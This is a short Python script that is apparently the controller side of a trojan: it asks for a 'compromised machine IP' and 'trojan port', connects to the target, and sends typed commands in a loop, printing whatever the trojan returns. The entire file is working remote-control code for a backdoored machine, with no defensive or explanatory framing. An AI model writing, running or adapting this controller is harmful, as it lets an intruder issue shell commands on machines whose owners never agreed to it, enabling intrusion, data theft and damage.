import socket

HOST = input('Enter compromised machine IP: ')
PORT = int(input('Enter trojan port: '))
ME = socket.gethostname()

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection.connect((HOST, PORT))

except ConnectionRefusedError:
    print('No trojan found')
    input('Press enter to exit')
    exit()
    
print()
while True:
    try:
        command = input(f'{ME}@trojan> ')
        connection.send(command.encode())
        output = connection.recv(8192)
        print(output.decode())

    except KeyboardInterrupt:
        connection.close()
        print(f'{ME}@trojan> exit')
        break
